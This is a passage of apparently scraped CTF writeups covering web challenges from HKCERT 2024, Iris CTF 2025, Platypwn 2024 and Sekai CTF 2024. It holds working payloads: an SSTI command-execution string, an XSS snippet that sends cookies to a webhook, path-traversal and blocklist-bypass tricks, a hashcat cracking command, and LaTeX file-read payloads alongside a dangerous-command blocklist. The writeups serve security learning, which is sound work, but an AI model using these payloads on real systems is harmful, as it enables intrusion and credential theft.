--enable-local-file-access a.html --enable-local-file-access a.pdf</code>, hence allowing the local file to be read this time. From there, we visit <code>a.pdf</code> to get the flag.</p> <p>TODO: I tried using ngrok to host the files but it didn't work for some reason. I ended up  using https://jsbin.com, which was what the guide used.</p>"},{"location":"Ctfs/Hkctf%202024%20writeups/#mystizs-mini-ctf2","title":"Mystiz's Mini CTF(2)","text":"<p>Both 1 and 2 use the same source code. This challenge involves a website which imitates a ctf platform. Users can register, login, submit flags and view the scoreboard. As part 2 had more solves, I decided to try it first. In both parts, the flags were hidden within challenges on that platform, with the first flag being a challenge that was solved by a fake player and the second being hidden in the description of an unreleased challenge <pre><code>def upgrade():  \n    ...\n    ADMIN_PASSWORD = os.urandom(33).hex()  \n    PLAYER_PASSWORD = os.urandom(3).hex()  \n\n    FLAG_1 = os.environ.get('FLAG_1', 'flag{***REDACTED1***}') \n    FLAG_2 = os.environ.get('FLAG_2', 'flag{***REDACTED2***}')  \n    RELEASE_TIME_NOW    = date.today()  \n    RELEASE_TIME_BACKUP = date.today() + timedelta(days=365)  \n\n    db.session.add(User(id=1, username='admin', is_admin=True, score=0, password=ADMIN_PASSWORD))  \n    db.session.add(User(id=2, username='player', is_admin=False, score=500, password=PLAYER_PASSWORD, last_solved_at=datetime.fromisoformat('2024-05-11T03:05:00')))  \n    db.session.add(Challenge(id=1, title='Hack this site!', description=f'I was told that there is &lt;a href=\"/\" target=\"_blank\"&gt;an unbreakable CTF platform&lt;/a&gt;. Can you break it?', category=Category.WEB, flag=FLAG_1, score=500, solves=1, released_at=RELEASE_TIME_NOW))  \n    ...\n    db.session.add(Challenge(id=7, title='A placeholder challenge', description=f'Many players complained that the CTF is too guessy. We heard you. As an apology, we will give you a free flag. Enjoy - &lt;code&gt;{FLAG_2}&lt;/code&gt;.', category=Category.MISC, flag=FLAG_2, score=500, solves=0, released_at=RELEASE_TIME_BACKUP))  \n\n    db.session.add(Attempt(challenge_id=1, user_id=2, flag=FLAG_1, is_correct=True, submitted_at=RELEASE_TIME_NOW))  \n    db.session.commit()\n</code></pre> Checking our <code>/challenges</code>, you can see the misc challenge is nowhere to be seen  We will somehow need a way to view that challenge. Looking at the templates of the challenge, we see there is an admin dashboard:  From the code, it seems like that dashboard allows us to view challenges: <pre><code>&lt;script&gt;  \n  async function listChallenges() {  \n    const listChallengesResponse = await fetch('/api/admin/challenges')  \n    const { challenges } = await listChallengesResponse.json() \n    ...\n  }\n  listChallenges()  \n  &lt;/script&gt;\n</code></pre> Checking out that route on the flask end, we can see this: <pre><code>@route.route('/', methods=[HTTPMethod.GET])  \n@login_required  \ndef list_challenges():  \n    if not current_user.is_admin:  \n        return jsonify({'error': 'not an admin'}), HTTPStatus.FORBIDDEN  \n    challenges = Challenge.query.all()  \n\n    return jsonify({  \n        'challenges': [challenge.admin_marshal() for challenge in challenges]  \n    }), HTTPStatus.OK\n</code></pre> The admin api seems to not perform any filtering, as opposed to the user api: challenge.py: <pre><code>class _QueryViewProperty:  \n    def __get__(self, obj, cls):  \n        return cls.query.filter(cls.released_at &lt;= datetime.now())  \n\nclass Challenge(db.Model):  \n    ...\n    query_view = _QueryViewProperty()\n</code></pre> views/__init__.py: <pre><code>class GroupAPI(MethodView):  \n    ...\n    def get(self):  \n        items = self.model.query_view.all()\n    ...\n\ndef register_api(app, model, name):  \n    group = GroupAPI.as_view(f'{name}_group', model)  \n    app.add_url_rule(f'/api/{name}/', view_func=group)  \n\ndef init_app(app):  \n    ...\n    app.register_blueprint(challenges.route, url_prefix='/api/challenges')  \n    ...\n    register_api(app, Challenge, 'challenges')\n    ...\n</code></pre> Hence, we should try to find a way to get admin to view the hidden challenge. The admin password is too long to be brute force, especially with a 2/min ratelimit on logging in. What if we find a way to give ourselves admin? From the <code>/register</code> endpoint: <pre><code>@route.route('/register/', methods=[HTTPMethod.POST])  \ndef register_submit():  \n    user = User()  \n    UserForm = model_form(User)  \n\n    form = UserForm(request.form, obj=user)\n\n    if not form.validate():  \n        flash('Invalid input', 'warning')  \n        return redirect(url_for('pages.register'))  \n\n    form.populate_obj(user)  \n\n    user_with_same_username = User.query_view.filter_by(username=user.username).first()  \n    if user_with_same_username is not None:  \n        flash('User with the same username exists.', 'warning')  \n        return redirect(url_for('pages.register'))  \n\n    db.session.add(user)  \n    db.session.commit()  \n\n    login_user(user)  \n    return redirect(url_for('pages.homepage'))\n</code></pre> This code seems to populate a user entry based on whatever the form specifies, then add the entry to the database. Indeed, we can see the form input names and the fields of the models correspond: <pre><code>&lt;form method=\"POST\" action=\"/register/\"&gt;  \n    ...\n    &lt;input type=\"text\" name=\"username\" class=\"form-control\" placeholder=\"Username\" autofocus&gt;  \n    ...\n    &lt;input type=\"password\" name=\"password\" class=\"form-control\" placeholder=\"Password\"&gt; \n    ...\n&lt;/form&gt;\n</code></pre> <pre><code>class User(db.Model):  \n    id = db.Column(db.Integer, primary_key=True)  \n    username = db.Column(db.String, nullable=False)  \n    is_admin = db.Column(db.Boolean, default=False)  \n    password = db.Column(db.String, nullable=False)  \n    score = db.Column(db.Integer, default=0)  \n    last_solved_at = db.Column(db.DateTime)\n</code></pre> There seems to be no validation of the form we submit, so what would happen if we added an extra form input for <code>is_admin</code>? Just like that, we are able to access the admin dashboard and get the flag  <code>hkcert24{y0u_c4n_wr1t3_unsp3c1f13d_4t7r1bu73s_t0_th3_us3r_m0d3l}</code></p>"},{"location":"Ctfs/Hkctf%202024%20writeups/#mystizs-mini-ctf2_1","title":"Mystiz's Mini CTF(2)","text":"<p>The first flag is harder. Flags for the challenges are all hashed  challenge.py: <pre><code>@event.listens_for(Challenge.flag, 'set', retval=True)  \ndef hash_challenge_flag(target, value, oldvalue, initiator):  \n    if value != oldvalue:  \n        return compute_hash(value)  \n    return value\n\n\ndef compute_hash(password, salt=None):  \n    if salt is None:  \n        salt = os.urandom(4).hex()  \n    return salt + '.' + hashlib.sha256(f'{salt}/{password}'.encode()).hexdigest()\n</code></pre> and no api will include even the hashed flag as part of their response. However, when searching around, we see that attempts do store unhashed flags attempts of every challenge submission: <pre><code>class Attempt(db.Model):  \n    id = db.Column(db.Integer, primary_key=True)  \n    challenge_id = db.Column(db.ForeignKey('challenge.id'), nullable=False)  \n    user_id = db.Column(db.ForeignKey('user.id'), nullable=False)  \n    flag = db.Column(db.String, nullable=False)  \n    is_correct = db.Column(db.Boolean, nullable=False)  \n    submitted_at = db.Column(db.DateTime, nullable=False)  \n\n    query_view = _QueryViewProperty()  \n\n    def marshal(self):  \n        return {  \n            'id': self.id,  \n            'challenge_id': self.challenge_id,  \n            'user_id': self.user_id,  \n            'is_correct': self.is_correct,  \n        }\n</code></pre> And from the migration script: <pre><code>db.session.add(Attempt(challenge_id=1, user_id=2, flag=FLAG_1, is_correct=True, submitted_at=RELEASE_TIME_NOW))\n</code></pre> As seen, <code>marshal()</code> does not include any information about the flag, so we need to extract it another way. Looking back at the webpage, we see something interesting about GroupApi: <pre><code>class GroupAPI(MethodView):  \n    ...\n    def get(self):\n        group = request.args.get('group')  \n        # If group exists and does not start with _ (Probs to hide private properties) and it exists in the Model requested  \n        if group is not None and not group.startswith('_') and group in dir(self.model):  \n            grouped_items = collections.defaultdict(list)  \n            # For each record  \n            for item in items:  \n                # Id is the value of the property?  \n                id = str(item.__getattribute__(group))  \n                grouped_items[id].append(item.marshal())  \n            return jsonify({self.name_plural: grouped_items}), 200  \n\n        return jsonify({self.name_plural: [item.marshal() for item in items]}), 200\n</code></pre> It seems to be able to accept a <code>group</code> query string which will group all records received by the <code>group</code> specified. Using that, we can extract fields that are not returned by <code>marshal()</code> As a POC, we can extract flags from our own solves:  In order to obtain the attempts by the <code>player</code>, we will need to be able to login to their account. The password for the player is suspiciously short compared to the admin password, so we could try cracking it <pre><code>ADMIN_PASSWORD = os.urandom(33).hex()  \n# TODO Password is suspiciously short  \nPLAYER_PASSWORD = os.urandom(3).hex()\n</code></pre> Using the previous method, we can obtain the hashed password along with its salt  From there, we plop the hash into hashcat to crack it hashfile.txt: <code>744c75c952ef0b49cdf77383a030795ff27ad54f20af8c71e6e9d705e5abfb94:77364c85/</code> <pre><code>hashcat -m 1420 -a 3 -o out.txt hashfile.txt ?h?h?h?h?h?h\n</code></pre> (Hashes differ because they are from another attempt) With the password, we can now login to the player account and employ the same trick to get the flag.   <code>hkcert24{y0u_c4n_9r0up_unsp3c1f13d_4t7r1bu73s_fr0m_th3_4tt3mp7_m0d3l}</code></p>"},{"location":"Ctfs/Iris%20ctf%202025%20Writeup/","title":"Iris ctf 2025 Writeup","text":""},{"location":"Ctfs/Iris%20ctf%202025%20Writeup/#password-manager","title":"Password manager","text":""},{"location":"Ctfs/Iris%20ctf%202025%20Writeup/#langsgo","title":"langs/go","text":"<p>A go challenge. Reading the code, we see the routing function with an interesting comment <pre><code>func pages(w http.ResponseWriter, r *http.Request) {\n    // You. Shall. Not. Path traverse!\n    path := PathReplacer.Replace(r.URL.Path)\n\n    if path == \"/\" {\n        homepage(w, r)\n        return\n    }\n\n    if path == \"/login\" {\n        login(w, r)\n        return\n    }\n\n    if path == \"/getpasswords\" {\n        getpasswords(w, r)\n        return\n    }\n\n    fullPath := \"./pages\" + path\n\n    if _, err := os.Stat(fullPath); os.IsNotExist(err) {\n        notfound(w, r)\n        return\n    }\n\n    http.ServeFile(w, r, fullPath)\n}\n</code></pre> It seems any undefined routes fallback to a static file being served from <code>./pages</code>. There seems to be a function to prevent path traversal, yet checking the function we can see it is flawed. <pre><code>var PathReplacer = strings.NewReplacer(\n    \"../\", \"\",\n)\n</code></pre> All this replacer does is remove occurances of <code>../</code> to prevent us moving up a directory. However, it will not remove nested a  <code>../</code>, allowing us to path traverse: <code>..././</code> -&gt; <code>../</code> Checking out <code>..././users.json</code>, we are given the login details of a user: <pre><code>{\n    \"skat\": \"rf=easy-its+just&amp;spicysines123!@\"\n}\n</code></pre> From there, we can login as that user to obtain the flag. <code>irisctf{l00k5_l1k3_w3_h4v3_70_t34ch_sk47_h0w_70_r3m3mb3r_s7uff}</code></p> <p>Notes: <code>....//</code> will get normalised into <code>..../</code> so that is invalid.</p>"},{"location":"Ctfs/Iris%20ctf%202025%20Writeup/#post-ctf-lessons","title":"Post ctf lessons","text":"<p>Official writeups at TODO Author writeups: https://github.com/Seraphin-/ctf/tree/master/2025/irisctf Full clear writeup at https://ireland.re/posts/irisctf_2025/</p>"},{"location":"Ctfs/Iris%20ctf%202025%20Writeup/#political","title":"Political","text":""},{"location":"Ctfs/Iris%20ctf%202025%20Writeup/#miscadmin-bot","title":"misc/admin-bot","text":"<p>This is an admin bot challenge with the filter being chrome's UrlBlockList policy. Our goal is to first claim a token then make the bot visit the <code>/giveflag</code> endpoint with our token to make it valid. From there, we can visit <code>/redeem</code> with that token to get the flag. <pre><code>  async function load_url(socket, data) {\n    let url = data.toString().trim();\n    console.log(`checking url: ${url}`);\n    // replace with your server as needed\n    if (!url.startsWith('http://localhost:1337/') &amp;&amp; !url.startsWith('https://localhost:1337/')) {\n      socket.state = 'ERROR';\n      socket.write('Invalid URL (must start with http:// or https://).\\n');\n      socket.destroy();\n      return;\n    }\n    socket.state = 'LOADED';\n    let cookie = JSON.parse(fs.readFileSync('/home/user/cookie'));\n\n    const context = await browser.createBrowserContext();\n    const page = await context.newPage();\n    await page.setJavaScriptEnabled(false);\n    await page.setCookie(cookie);\n    socket.write(`Loading page ${url}.\\n`);\n    setTimeout(()=&gt;{\n      try {\n        context.close();\n        socket.write('timeout\\n');\n        socket.destroy();\n      } catch (err) {\n        console.log(`err: ${err}`);\n      }\n    }, BOT_TIMEOUT);\n    await page.goto(url);\n  }\n</code></pre> As seen from the dockerfile <pre><code>...\nRUN mkdir -p /etc/opt/chrome_for_testing/policies/managed/\nRUN chmod -R -w /etc/opt/chrome_for_testing/\nCOPY policy.json /etc/opt/chrome_for_testing/policies/managed/\n...\n</code></pre> , the <code>policy.json</code> file is created with these blocklists: <pre><code>{\n    \"URLBlocklist\": [\"*/giveflag\", \"*?token=*\"]\n}\n</code></pre> The second blocklist seems easy to bypass with a query like <code>?a=lol&amp;token=...</code>, however one should first consult the documentation to understand how the blocklist functions(which I didn't do and wasted a lot of time on). As from the docs, it is stated that \"Token order is ignored during matching.\", hence the query would still be blocked.</p>"},{"location":"Ctfs/Iris%20ctf%202025%20Writeup/#the-solution","title":"The solution","text":"<p>Turns out, url encoding the url will bypass both filters. </p>"},{"location":"Ctfs/Iris%20ctf%202025%20Writeup/#lessons-learnt","title":"Lessons learnt","text":"<ul> <li>Url encoding should be tried a bit more in admin bot challenges, given that chrome doesn't bother decoding the url </li> <li>Always try to replicate the important parts of the challenge environment to be as easy to debug as possible. In this case, I should've also replicated the chromium browser and inputted urls directly into it to see if they were getting blocked. </li> </ul>"},{"location":"Ctfs/Iris%20ctf%202025%20Writeup/#bad-todo","title":"Bad todo","text":"<p>Skipped this challenge but authors' writeup at https://rph.space/blog/irisctf-2025-bad-todo/ </p>"},{"location":"Ctfs/Iris%20ctf%202025%20Writeup/#webwebhookhook","title":"Webwebhookhook","text":""},{"location":"Ctfs/Iris%20ctf%202025%20Writeup/#langsjava","title":"langs/java","text":""},{"location":"Ctfs/Iris%20ctf%202025%20Writeup/#misclanguage-quirks","title":"misc/language-quirks","text":"<p>A challenge where we can create and ping webhooks to get them to send data to their configured urls.  <pre><code>class StateType(\n        hook: String,\n        var template: String,\n        var response: String\n        ) {\n    var hook: URL = URI.create(hook).toURL()\n}\nobject State {\n    var arr = ArrayList&lt;StateType&gt;()\n}\n/* ... (main file) */\nconst val FLAG = \"irisctf{test_flag}\";\n\nfun main(args: Array&lt;String&gt;) {\n    // TODO We need a way to get this webhook to send to a domain we control.\n    State.arr.add(StateType(\n            \"http://example.com/admin\",\n            \"{\\\"data\\\": _DATA_, \\\"flag\\\": \\\"\" + FLAG + \"\\\"}\", // TODO not actually json object, we could mess with this\n            \"{\\\"response\\\": \\\"ok\\\"}\"))\n    runApplication&lt;WebwebhookhookApplication&gt;(*args)\n}\n</code></pre> Checking the endpoint for pinging webhooks, we see something interesting: <pre><code>    @PostMapping(\"/webhook\")\n    @ResponseBody\n    fun webhook(@RequestParam(\"hook\") hook_str: String, @RequestBody body: String, @RequestHeader(\"Content-Type\") contentType: String, model: Model): String {\n        var hook = URI.create(hook_str).toURL();\n        for (h in State.arr) {\n            if(h.hook == hook) {\n                var newBody = h.template.replace(\"_DATA_\", body);\n                var conn = hook.openConnection() as? HttpURLConnection; // TODO Interestingly, the url we supply is used\n                if(conn === null) break;\n                conn.requestMethod = \"POST\";\n                conn.doOutput = true;\n                conn.setFixedLengthStreamingMode(newBody.length);\n                conn.setRequestProperty(\"Content-Type\", contentType);\n                conn.connect()\n                conn.outputStream.use { outputStream -&gt;\n                    outputStream.write(newBody.toByteArray())\n                }\n\n                return h.response\n            }\n        }\n        return \"{\\\"result\\\": \\\"fail\\\"}\"\n    }\n</code></pre> The function checks through each webhook and compares its url against a <code>URL</code> we provide. Once it finds a webhook with matching urls, it will send a post request to its configured url. However, it should be noted that the url it uses is the one we send, not the configured url(even though they should be equal). This means if we could have 2 urls that are said to be equal yet point to different addresses, we could get the flag sent to us instead. In this case, our url should equal <code>http://example.com/admin</code>. </p>"},{"location":"Ctfs/Iris%20ctf%202025%20Writeup/#javas-url-equality","title":"Java's URL equality","text":"<p>Turns out, java checks urls for equality by resolving them (https://news.ycombinator.com/item?id=21765788). By performing a DNS rebinding attack, we can get the url to first resolve to <code>example.com</code>  and quickly swap records to point to our own address.  While I am too lazy to actually figure out how the attack is carried out, I have some resources: * https://ireland.re/posts/irisctf_2025/#webwebwebhookhook-16-solves     * Used https://requestrepo.com/ * https://github.com/nccgroup/singularity     * Seems to have a public instance(?) at http://rebind.it:8080/manager.html</p>"},{"location":"Ctfs/Platypwn%202024%20Writeups/","title":"Platypwn 2024 Writeups","text":""},{"location":"Ctfs/Platypwn%202024%20Writeups/#os-detection","title":"OS Detection.","text":""},{"location":"Ctfs/Platypwn%202024%20Writeups/#langspython","title":"langs/python","text":"<p>A SSTI challenge with source code provided.  <pre><code>from flask import Flask, request, render_template, render_template_string\nfrom ua_parser import user_agent_parser\n\napp = Flask(__name__)\n\n@app.route(\"/\")\ndef home():\n    user_agent = request.headers.get('User-Agent')\n    try:\n        parsed_string = user_agent_parser.Parse(user_agent)\n        family = parsed_string['os']['family']\n        user_agent_hint = render_template_string(user_agent)\n        return render_template('index.html', os=family, user_agent=user_agent_hint)\n    except Exception as e:\n        return render_template('failure.html', error=str(e))\n\n@app.route(\"/source\")\ndef source():\n    code = open(__file__).read()\n    return render_template_string(\"&lt;pre&gt;{{ code }}&lt;/pre&gt;\", code=code)\n\n\nif __name__ == \"__main__\":\n    # No debug, that would be insecure!\n    #app.run(debug=True)\n    app.run()\n</code></pre> Our user agent is directly passed to <code>render_template_string</code> to be rendered, leading to SSTI. Payload: <pre><code>{{cycler.__init__.__globals__.os.popen('cat /app/flag/flag.txt').read()}}\n</code></pre> <code>PP{h4ck3r-OS-d3t3ct3d::BEZvg-hcyu2a}</code></p>"},{"location":"Ctfs/Platypwn%202024%20Writeups/#notes","title":"Notes","text":""},{"location":"Ctfs/Platypwn%202024%20Writeups/#langsjava","title":"langs/java","text":""},{"location":"Ctfs/Platypwn%202024%20Writeups/#libsapache-struts","title":"libs/apache-struts","text":"<p>A java web server featuring a note management app. Source code is provided</p>"},{"location":"Ctfs/Platypwn%202024%20Writeups/#intended-solution","title":"Intended solution","text":"<p>The goal of this challenge is to steal the cookie of an admin bot. After registering and messing around, we find that notes stored aren't escaped when displayed, allowing for XSS. <pre><code>...\n&lt;p class=\"block\"&gt;  \n  &lt;s:if test=\"note.body == ''\"&gt;  \n    &lt;em&gt;This note is empty&lt;/em&gt;  \n  &lt;/s:if&gt;  \n  &lt;s:else&gt;  \n    &lt;s:property escapeHtml=\"false\" value=\"note.body\"/&gt;  \n  &lt;/s:else&gt;  \n&lt;/p&gt;\n...\n</code></pre> With this, we could craft a payload such as <pre><code>&lt;script&gt;\nnavigator.sendBeacon(\"&lt;webhook&gt;/?q=\"+document.cookie)\n&lt;/script&gt;\n</code></pre> and get the bot to visit our note using <code>/report</code>.  <pre><code>public class ReportAction extends ActionSupport implements ServletRequestAware {\n    ...\n    @AllowMethod(HttpMethod.GET)  \n    @AllowMethod(HttpMethod.POST)  \n    public String execute() {  \n        if (HttpMethod.GET.equals(this.request.getMethod())) {  \n            return INPUT;  \n        }  \n\n        if (this.isNullOrEmpty(this.title)) {  \n            addFieldError(\"title\", \"Please provide a title\");  \n        }  \n        if (this.isNullOrEmpty(this.getJoinedDescription())) {  \n            addFieldError(\"description\", \"Please provide a description\");  \n        }  \n        if (this.isNullOrEmpty(this.url)) {  \n            addFieldError(\"url\", \"Please provide a URL\");  \n        } else {  \n            try {  \n                URI uri = new URI(this.url);  \n                uri.toURL();  \n            } catch (IllegalArgumentException | URISyntaxException | MalformedURLException ex) {  \n                addFieldError(\"url\", \"Please provide a valid URL\");  \n            }  \n        }  \n        if (hasFieldErrors()) {  \n            return INPUT;  \n        }  \n\n        try (Playwright playwright = Playwright.create()) {  \n            Browser browser;  \n            if (System.getenv(\"DOCKER\") != null) {  \n                browser = playwright.chromium().launch();  \n            } else {  \n                browser = playwright.chromium().launch(new LaunchOptions().setExecutablePath(Path.of(\"/usr/bin/chromium\")));  \n            }  \n\n            BrowserContext context;  \n            if (System.getenv(\"DOCKER\") != null) {  \n                context = browser.newContext(new Browser.NewContextOptions().setStorageStatePath(Paths.get(\"/var/lib/jetty/browser-state.json\")));  \n            } else {  \n                context = browser.newContext(new Browser.NewContextOptions().setStorageStatePath(Paths.get(\"browser-state.json\")));  \n            }  \n            context.setDefaultTimeout(10_000);  \n\n            Page page = context.newPage();  \n            if (!page.navigate(this.url).ok()) {  \n                this.addActionError(\"Could not reach provided url\");  \n                return ERROR;  \n            }  \n            this.screenshot = page.screenshot();  \n            page.close();  \n        } catch (Exception ex) {  \n            this.addActionError(\"Unknown error: \" + ex.getMessage());  \n            return ERROR;  \n        }  \n\n        return SUCCESS;  \n    }\n    ...\n}\n</code></pre> Unfortunately, notes are tied to a user account and can't be viewed by anyone else.  <pre><code>@LoginRequired  \n@AllowMethod(HttpMethod.POST)  \npublic String create() {  \n    this.id = this.getUser().createNote().getId();  \n\n    return INPUT;  \n}\n\n@LoginRequired  \n@AllowMethod(HttpMethod.GET)  \n@AllowMethod(HttpMethod.POST)  \npublic String edit() {  \n    if (!this.getUser().getNote(this.id).isPresent()) {  \n        return \"not-found\";  \n    }  \n\n    if (HttpMethod.GET.equals(this.request.getMethod())) {  \n        return INPUT;  \n    }  \n\n    this.getNote().setTitle(this.title);  \n    this.getNote().setBody(this.body);  \n\n    return \"view\";  \n}\n</code></pre> <code>User.java</code>: <pre><code>public Optional&lt;Note&gt; getNote(UUID id) {  \n    return Optional.ofNullable(this.notes.get(id));  \n}\n</code></pre> From here, we have only 2 options: Get the bot to view and create its own notes or get the bot to somehow view our note. Checking the stored cookies, we see that there seems to be a session cookie stored. </p> <p>From this point, I'll just reference the solution of the challenge author. \"For some reason, I tried to access my app with <code>curl</code> and noticed that all URLs generated with helpers from the framework include the session cookie: <code>/sample.action;jsessionid=[\u2026]</code>.\"</p> <p>The Apache Struts framework seems to be able to store the session cookie within the url if cookies are disabled/disallowed. We can test this by blocking cookie access and see the cookie embedded in the url.  By giving this cookie to the bot, we can give it our account and have it view our payload, thus exfiltrating the cookie.</p>"},{"location":"Ctfs/Platypwn%202024%20Writeups/#the-cheese","title":"The cheese","text":"<p>With most browsers, the <code>file://</code> protocol is also supported, allowing users to view a file locally from within the browser. One interesting thing to note about this challenge that the cookies are loaded from a file, meaning we can also view the cookies from the browser <pre><code>                context = browser.newContext(new Browser.NewContextOptions().setStorageStatePath(Paths.get(\"/var/lib/jetty/browser-state.json\")));  \n</code></pre> We can report the <code>file:///var/lib/jetty/browser-state.json</code> url and it will be successfully parsed and accepted by <code>URI()</code>, while the challenge kindly screenshots the resulting page for us, allowing us to view the flag. </p> <p>Lessons learnt: Maybe try screwing around with cookie access from the browser and see if the server supports storing cookies in some other way(The url in this case)</p>"},{"location":"Ctfs/Platypwn%202024%20Writeups/#post-ctf-lessons","title":"Post ctf lessons","text":""},{"location":"Ctfs/Platypwn%202024%20Writeups/#pretty-html-page","title":"Pretty HTML Page","text":""},{"location":"Ctfs/Platypwn%202024%20Writeups/#langsphp","title":"langs/php","text":"<p>If a challenge is really simple and has little external dependencies, you should check for  issues related to the language itself, even if the language version is roughly up to date. Especially for php. <pre><code>&lt;?php  \n    if ($_SERVER[\"REQUEST_METHOD\"] == \"POST\") {  \n        $input = $_POST[\"input_string\"];  \n        echo \"input is \" . $input;  \n        if (mb_strpos($input, \"flag\") !== false) {  \n            $a = mb_strpos($input, \"flag\");  \n            echo \"&lt;p&gt;Input contains 'flag' at position \" . $a . \"&lt;/p&gt;\";  \n            $b = mb_substr($input, 0, $a);  \n            echo \"redacted to \" . $b;  \n            $input = $b . \"REDACTED\";  \n            echo \"&lt;p&gt;You wrote: \" . htmlentities($input, ENT_QUOTES, 'UTF-8') . \"&lt;/p&gt;\";  \n        }  \n        else {  \n            echo \"&lt;p&gt;Input does not contain 'flag'&lt;/p&gt;\";  \n            $b = $input;  \n            echo \"&lt;p&gt;You wrote: \" . htmlentities($b, ENT_QUOTES, 'UTF-8') . \"&lt;/p&gt;\";  \n        }  \n\n        if (mb_strpos($b, \"flag\") !== false) {  \n            $file_to_flag = \"/flag/flag.txt\";  \n            $flag = file_get_contents($file_to_flag);  \n            echo \"&lt;p&gt;Congrats! Here is your flag: \" . $flag . \"&lt;/p&gt;\";  \n        }  \n    }  \n?&gt;\n</code></pre> From the code, the only 2 functions that determined if we got the flag were <code>mb_strpos</code> and <code>mb_substr</code>, hence the focus should have been on them. In this case, searching for <code>php mb_strpos cve</code>  lead me to this link: https://www.sonarsource.com/blog/joomla-multiple-xss-vulnerabilities/</p>"},{"location":"Ctfs/Platypwn%202024%20Writeups/#texnically-insecure-texnically-insecure-revenge","title":"TeXnically Insecure + TeXnically Insecure Revenge","text":""},{"location":"Ctfs/Platypwn%202024%20Writeups/#langslatex","title":"langs/latex","text":"<p>A site which parses a latex document to pdf. Reviewing the code, we see some latex commands are blacklisted: <pre><code>TEX_TEMPLATE = r\"\"\"\n\\documentclass{article}\n\\begin{document}\n%s\n\\end{document}\n\"\"\"\n\ndangerous_commands = [\n    r'\\\\openin', r'\\\\newread', r'\\\\include', r'\\\\usepackage', r'\\\\closein', r'\\\\newwrite', r'\\\\openout',\n    r'\\\\write', r'\\\\closeout', r'\\\\write18', r'\\\\url', r'\\\\read', r'\\\\input', r'\\\\def', r'\\^', r'\\\\catcode',\n    r'\\\\immediate', r'\\\\csname', r'\\\\makeatletter', r'\\\\readline', r'\\\\uccode', r'\\\\lccode'\n]\n\ndef check_for_dangerous_commands(latex_input):\n    found_commands = []\n\n    for command in dangerous_commands:\n        if re.search(command, latex_input, flags=re.IGNORECASE):\n            found_commands.append(command)\n\n    if found_commands:\n        raise ValueError(f\"Dangerous LaTeX commands found: {', '.join(found_commands)}\")\n\n    return latex_input\n@app.route('/render', methods=['POST'])\ndef render_latex():\n    try:\n        latex_input = request.form['latex']\n\n        check_for_dangerous_commands(latex_input)\n\n        tex_file = \"output.tex\"\n        with open(tex_file, \"w\") as f:\n            f.write(TEX_TEMPLATE % latex_input)\n\n        subprocess.run([\"pdflatex\", \"-interaction=nonstopmode\", tex_file])\n\n        pdf_file = \"output.pdf\"\n        if os.path.exists(pdf_file):\n            return send_file(pdf_file, mimetype='application/pdf')\n        else:\n            return \"Error in generating PDF\"\n\n    except ValueError as e:\n        return str(e), 400\n\n    finally:\n        files = [\"output.tex\", \"output.pdf\", \"output.log\", \"output.aux\"]\n        for file in files:\n            if os.path.exists(file):\n                os.remove(file)\n</code></pre> While I was attempting the challenge, a revenge challenge was released. By diffing the files, we see the blacklist in the revenge is now stricter, triggering as long as any of the keywords exist <pre><code>dangerous_commands = [\n    r'openin', r'newread', r'include', r'usepackage', r'closein', r'newwrite', r'openout',\n    r'write', r'closeout', r'write18', r'url', r'read', r'input', r'def', r'\\^', r'catcode',\n    r'immediate', r'csname', r'makeatletter', r'readline', r'uccode', r'lccode'\n]\n</code></pre> I eventually found a payload from https://book.jorianwoltjer.com/languages/latex#filter-bypass#:~:text=begin{input},end{input} which did not require <code>\\input</code>, and could bypass the blacklist for the first challenge. <code>\\begin{input}/flag/flag.txt\\end{input}</code> For the revenge challenge, I've compiled a list of payloads from the discord <code>\\begin{inpu\\iftrue t\\fi}{\"/flag/flag.txt\"}</code> by roehrt</p> <pre><code>\\pdfobj stream file {/flag/flag.txt}\n\\pdfrefobj 1\nhallo\n</code></pre> <p>\"in both versions to directly embed the flag in the pdf as a raw stream, because that's apparently something people have a legitimate use-case for?\"</p> <p>by tomato6333 <pre><code>\\ttfamily\n\\pdffiledump offset 0 length \\pdffilesize{/flag/flag.txt}{/flag/flag.txt}\n</code></pre> by vicevirus</p> <p><code>\\begin{input}{/flag/flag.txt}</code> also works actually by liekedaeler(Chal author)</p> <p>Lastly, there is an official writeup by the challenge author at TeXnically_Insecure_author_writeup</p>"},{"location":"Ctfs/Platypwn%202024%20Writeups/#secure-sign-on","title":"Secure sign on","text":""},{"location":"Ctfs/Platypwn%202024%20Writeups/#langsrust","title":"langs/rust","text":"<p>Account takeover from improper merging. TODO: Basically, always trust your logs and check if something seems off: In this case, I incorrectly assumed user registration would happen instantly as the cat video note would be clicked immediately. However, the original db creation had never included such a note. Additionally, the logs showed there was a constant request to the notes page, and I had no clue why the requests to the notes page by the bot was still being made. Turns out, it was waiting for a cat video note to be posted(by the attacker). </p>"},{"location":"Ctfs/Sekai%20Ctf%202024%20writeups/","title":"Sekai Ctf 2024 writeups","text":"<p>Only managed to solve 1 ):</p>"},{"location":"Ctfs/Sekai%20Ctf%202024%20writeups/#tagless","title":"Tagless","text":"<p>This challenge was a web challenge involving flask. This was my first ctf where challenges needed to be launched and had a time limit, leading to some confusion when accessing the challenge instance. A good learning point from this was to always attempt to reproduce the challenge locally, if possible. This challenge had 3 important endpoints: <code>/</code> * The index page, which seems to display whatever message you supply in an iframe *  <code>/report</code> *  Seems to get the bot to visit a localhost url <pre><code>@app.route(\"/report\", methods=[\"POST\"])  \ndef report():  \n    bot = Bot()  \n    url = request.form.get('url')  \n    if url:  \n        try:  \n            parsed_url = urlparse(url)  \n            print(\"visiting \", parsed_url)  \n        except Exception:  \n            return {\"error\": \"Invalid URL.\"}, 400  \n        if parsed_url.scheme not in [\"http\", \"https\"]:  \n            return {\"error\": \"Invalid scheme.\"}, 400  \n        if parsed_url.hostname not in [\"127.0.0.1\", \"localhost\"]:  \n            return {\"error\": \"Invalid host.\"}, 401  \n        bot.visit(url)  \n        bot.close()  \n        return {\"visited\":url}, 200  \n    else:  \n        return {\"error\":\"URL parameter is missing!\"}, 400\n</code></pre> <code>/&lt;anything else&gt;</code> *  Small yet important, it simply tells you the <code>url path</code> you supplied was not found Next,  we need to find where the flag is stored. Searching around, you find this in <code>bot.py</code> <pre><code>class Bot:  \n    def __init__(self):  \n        ...\n    def visit(self, url):  \n        self.driver.get(\"http://127.0.0.1:5000/\")  \n        self.driver.add_cookie({  \n            \"name\": \"flag\",   \n            \"value\": \"SEKAI{dummy}\",   \n            \"httponly\": False    \n        })   \n        self.driver.get(url)  \n        time.sleep(1)  \n        self.driver.refresh()\n</code></pre> This is where the <code>report</code> endpoint comes in handy, as it gets the bot to first visit and add a cookie to  itself, then open a corresponding url supplied. If we want any chance of stealing the cookie,  the url we visit must be the same url the cookie was added to (localhost). From there, we need some way to exfiltrate the cookie.  Looking back 